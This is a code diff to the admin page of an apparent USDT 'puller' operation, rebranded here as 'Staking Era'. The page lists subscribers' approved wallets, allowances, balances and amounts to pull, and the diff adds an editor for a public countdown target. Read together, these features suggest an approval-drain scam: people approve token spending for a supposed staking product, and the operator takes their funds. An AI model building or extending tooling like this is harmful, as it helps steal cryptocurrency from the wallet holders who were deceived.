@@ -6,15 +6,15 @@
   <title>Admin – USDT Puller</title>
   <style>
     :root {
-      --bg:#040712;
-      --bg-gradient: radial-gradient(120% 120% at 50% 0%, rgba(0,223,154,0.2) 0%, rgba(5,7,18,0.95) 55%, rgba(4,7,18,1) 100%);
-      --surface:#0d1530;
-      --surface-soft:rgba(13,21,48,0.65);
+      --bg:#030014;
+      --bg-gradient: radial-gradient(120% 130% at 50% 0%, rgba(149,92,255,0.2) 0%, rgba(8,9,27,0.95) 60%, rgba(2,4,9,1) 100%);
+      --surface:#090821;
+      --surface-soft:rgba(13,17,44,0.65);
       --border:rgba(255,255,255,0.08);
-      --text:#f5f7ff;
-      --muted:#9aa7c8;
-      --accent:#00df9a;
-      --accent-strong:#02f6ab;
+      --text:#f8f6ff;
+      --muted:#b2b5d1;
+      --accent:#dfa0ff;
+      --accent-strong:#ffd1ff;
       --danger:#ff7b84;
     }
     *{box-sizing:border-box}
@@ -138,6 +138,9 @@
       display:flex;
       flex-direction:column;
       gap:28px;
+      max-width:1200px;
+      margin:0 auto;
+      width:min(1200px, 100%);
     }
     .panel{
       background:rgba(12,18,40,0.78);
@@ -181,6 +184,49 @@
       grid-template-columns:repeat(auto-fit,minmax(200px,1fr));
       gap:18px;
     }
+    .countdown-editor{
+      margin-top:12px;
+      border:1px solid rgba(255,255,255,0.12);
+      border-radius:20px;
+      padding:18px 22px;
+      background:rgba(7,10,28,0.75);
+      display:flex;
+      flex-direction:column;
+      gap:10px;
+    }
+    .countdown-editor__row{
+      display:flex;
+      justify-content:space-between;
+      align-items:center;
+      gap:16px;
+      flex-wrap:wrap;
+    }
+    .countdown-editor label{
+      font-size:0.75rem;
+      letter-spacing:0.16em;
+      text-transform:uppercase;
+      color:var(--muted);
+    }
+    .countdown-editor small{
+      color:var(--muted);
+      font-size:0.8rem;
+    }
+    .countdown-editor__controls{
+      display:flex;
+      flex-wrap:wrap;
+      gap:12px;
+      align-items:center;
+    }
+    .countdown-editor input{
+      flex:1;
+      min-width:220px;
+      padding:10px 14px;
+      border-radius:12px;
+      border:1px solid rgba(255,255,255,0.18);
+      background:rgba(9,14,28,0.8);
+      color:var(--text);
+      font-size:0.9rem;
+    }
     .stat-card{
       background:rgba(20,28,58,0.75);
       border:1px solid rgba(255,255,255,0.12);
@@ -209,8 +255,20 @@
       margin-top:16px;
       border:1px solid rgba(255,255,255,0.08);
       border-radius:20px;
-      overflow:hidden;
       background:rgba(13,19,40,0.6);
+      position:relative;
+      box-shadow:0 30px 60px rgba(2,6,18,0.45);
+    }
+    .table-scroll{
+      overflow-x:auto;
+      -webkit-overflow-scrolling:touch;
+    }
+    .table-scroll::-webkit-scrollbar{
+      height:6px;
+    }
+    .table-scroll::-webkit-scrollbar-thumb{
+      background:rgba(2,246,171,0.4);
+      border-radius:99px;
     }
     table{
       width:100%;
@@ -331,12 +389,36 @@
     @media (max-width:980px){
       table{min-width:680px;}
       .controls{justify-content:flex-end;}
+      .panel{
+        padding:24px clamp(16px, 4vw, 30px);
+      }
+      .stats-row{
+        gap:12px;
+      }
+      th, td{
+        padding:12px 14px;
+      }
+      .table-wrapper{
+        border-radius:18px;
+      }
     }
     @media (max-width:720px){
       .topbar{flex-direction:column;align-items:flex-start;gap:16px;}
       button.primary, button.ghost{width:100%;}
       .controls{width:100%;justify-content:stretch;}
       .controls button{flex:1;}
+    }
+    @media (max-width:640px){
+      main{padding:20px 14px;}
+      .panel{padding:22px 18px;}
+      .table-wrapper{margin-top:12px;}
+      .table-scroll{padding:0 6px;}
+      th,td{
+        font-size:0.78rem;
+      }
+      .empty-state{
+        padding:24px;
+      }
     }
   </style>
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.12.1/dist/ethers.umd.min.js"></script>
@@ -346,10 +428,10 @@
 <body>
   <header class="topbar">
     <div class="brand">
-      <span class="logo">UP</span>
+      <span class="logo">SE</span>
       <div>
-        <div>USDT Puller</div>
-        <small>Admin Console</small>
+        <div>Staking Era</div>
+        <small>Command Center</small>
       </div>
     </div>
     <div class="controls">
@@ -366,7 +448,7 @@
       <div class="panel-header">
         <div>
           <h1>Subscribers</h1>
-          <p>Review approved wallets, their referral lineage, and trigger pulls when the contract operator is connected.</p>
+          <p>Monitor approved wallets, trace referral lineage, and execute precise pulls whenever the operator is ready.</p>
         </div>
         <div class="meta-grid">
           <span>Operator (contract): <span class="mono" id="operator">—</span></span>
@@ -378,38 +460,56 @@
         <div class="stat-card">
           <span class="label">Total subscribers</span>
           <strong id="adminTotal">0</strong>
-          <small>Unique wallets recorded by the backend</small>
+          <small>Active approvals stored on the server</small>
         </div>
         <div class="stat-card">
           <span class="label">Referred users</span>
           <strong id="adminReferred">0</strong>
-          <small>Approvals credited to a referral code</small>
+          <small>Wallets attributed to referral codes</small>
+        </div>
+      </div>
+
+      <div class="countdown-editor">
+        <div class="countdown-editor__row">
+          <label for="countdownTarget">Countdown target</label>
+          <small id="countdownHint">Loading current target…</small>
+        </div>
+        <div class="countdown-editor__controls">
+          <input type="datetime-local" id="countdownTarget" />
+          <button class="primary" id="btnUpdateCountdown">Update target</button>
+          <button class="ghost" id="btnResetCountdown">Reset</button>
+        </div>
+        <div class="countdown-editor__controls">
+          <input type="number" min="1" id="countdownDays" placeholder="Days from now" />
+          <button class="primary" id="btnSetCountdownDays">Set days</button>
         </div>
       </div>
 
       <div class="table-wrapper">
-        <table id="usersTbl">
-          <thead>
-            <tr>
-              <th>#</th>
-              <th>Date</th>
-              <th>Address</th>
-              <th>Refer Code</th>
-              <th>Referred By</th>
-              <th>Allowance</th>
-              <th>Balance</th>
-              <th>Amount to pull</th>
-              <th>Action</th>
-            </tr>
-          </thead>
-          <tbody></tbody>
-        </table>
+        <div class="table-scroll">
+          <table id="usersTbl">
+            <thead>
+              <tr>
+                <th>#</th>
+                <th>Date</th>
+                <th>Address</th>
+                <th>Refer Code</th>
+                <th>Referred By</th>
+                <th>Allowance</th>
+                <th>Balance</th>
+                <th>Amount to pull</th>
+                <th>Action</th>
+              </tr>
+            </thead>
+            <tbody></tbody>
+          </table>
+        </div>
         <div class="empty-state" id="emptyState">No subscribers yet.</div>
       </div>
     </section>
 
     <section class="log-panel">
-      <h2>Activity</h2>
+      <h2>Live Events</h2>
       <pre id="log"></pre>
     </section>
   </main>
@@ -430,6 +530,12 @@
   const logEl = el('log');
   const btnConnect = el('btnConnect');
   const btnSwitch = el('btnSwitch');
+  const countdownInput = el('countdownTarget');
+  const btnUpdateCountdown = el('btnUpdateCountdown');
+  const btnResetCountdown = el('btnResetCountdown');
+  const daysInput = el('countdownDays');
+  const btnSetCountdownDays = el('btnSetCountdownDays');
+  const countdownHint = el('countdownHint');
 
   el('pullerAddr').textContent = PULLER_ADDRESS;
   el('assetAddr').textContent  = USDT_ADDRESS;
@@ -442,6 +548,56 @@
   const setStatus = (text, variant = 'neutral') => {
     statusBadge.textContent = text;
     statusBadge.className = `badge ${variant}`;
+  };
+
+  const MS_MINUTE = 60 * 1000;
+  const toDatetimeLocalValue = (value) => {
+    if (!value) return '';
+    const date = new Date(value);
+    if (!Number.isFinite(date)) return '';
+    const offset = date.getTimezoneOffset();
+    const local = new Date(date.getTime() - offset * MS_MINUTE);
+    return local.toISOString().slice(0, 16);
+  };
+  const formatLocalLabel = (value) => {
+    return Number.isFinite(value) ? new Date(value).toLocaleString() : '—';
+  };
+
+  const sendCountdownUpdate = async (payload) => {
+    const res = await fetch(`${BACKEND}/api/countdown`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+    if (!res.ok) {
+      const errBody = await res.json().catch(() => ({}));
+      throw new Error(errBody?.error || `status ${res.status}`);
+    }
+    return res.json();
+  };
+
+  const loadCountdownTarget = async () => {
+    if (!countdownHint && !countdownInput) return;
+    try {
+      const res = await fetch(`${BACKEND}/api/countdown`, { cache: 'no-store' });
+      if (!res.ok) throw new Error(`status ${res.status}`);
+      const payload = await res.json();
+      const parsedTarget = Number.isFinite(Number(payload?.target))
+        ? Number(payload.target)
+        : Number.isFinite(Date.parse(payload?.endDate))
+          ? Date.parse(payload.endDate)
+          : null;
+      if (countdownInput) {
+        countdownInput.value = toDatetimeLocalValue(parsedTarget);
+      }
+      if (countdownHint) {
+        const label = formatLocalLabel(parsedTarget);
+        countdownHint.textContent = parsedTarget ? `Current target: ${label}` : 'No countdown target set';
+      }
+    } catch (error) {
+      if (countdownHint) countdownHint.textContent = 'Unable to load countdown target.';
+      log('countdown load error: ' + (error?.message || error));
+    }
   };
 
   const shorten = (addr) => addr ? `${addr.slice(0, 6)}…${addr.slice(-4)}` : '';
@@ -635,12 +791,72 @@
     ensureBSC().catch(err => log('switch error: ' + (err?.message || err)));
   });
 
+  if (btnUpdateCountdown) {
+    btnUpdateCountdown.addEventListener('click', async () => {
+      if (!countdownInput?.value) {
+        alert('Choose a valid target date and time.');
+        return;
+      }
+      btnUpdateCountdown.disabled = true;
+      try {
+        const iso = new Date(countdownInput.value).toISOString();
+        const data = await sendCountdownUpdate({ target: iso });
+        if (countdownHint) countdownHint.textContent = `Current target: ${formatLocalLabel(Number(data.target))}`;
+        log(`countdown target updated → ${iso}`);
+      } catch (error) {
+        alert('Unable to update countdown: ' + (error?.message || ''));
+      } finally {
+        btnUpdateCountdown.disabled = false;
+        await loadCountdownTarget();
+      }
+    });
+  }
+
+  if (btnResetCountdown) {
+    btnResetCountdown.addEventListener('click', async () => {
+      if (!confirm('Reset countdown target to the default fallback?')) return;
+      btnResetCountdown.disabled = true;
+      try {
+        await sendCountdownUpdate({ clear: true });
+        log('countdown target reset to default');
+        if (countdownHint) countdownHint.textContent = 'Countdown target reset to default.';
+      } catch (error) {
+        alert('Unable to reset countdown: ' + (error?.message || ''));
+      } finally {
+        btnResetCountdown.disabled = false;
+        await loadCountdownTarget();
+      }
+    });
+  }
+
+  if (btnSetCountdownDays) {
+    btnSetCountdownDays.addEventListener('click', async () => {
+      const days = Number(daysInput?.value);
+      if (!Number.isFinite(days) || days <= 0) {
+        alert('Enter a number of days greater than zero.');
+        return;
+      }
+      btnSetCountdownDays.disabled = true;
+      try {
+        const data = await sendCountdownUpdate({ daysFromNow: days });
+        if (countdownHint) countdownHint.textContent = `Current target: ${formatLocalLabel(Number(data.target))}`;
+        log(`countdown target set to ${days} days from now`);
+      } catch (error) {
+        alert('Unable to set countdown: ' + (error?.message || ''));
+      } finally {
+        btnSetCountdownDays.disabled = false;
+        await loadCountdownTarget();
+      }
+    });
+  }
+
   if (window.ethereum?.on) {
     window.ethereum.on('chainChanged', () => window.location.reload());
     window.ethereum.on('accountsChanged', () => window.location.reload());
   }
 
   await loadUsers(false);
+  await loadCountdownTarget();
 })();
 </script>
 </body>
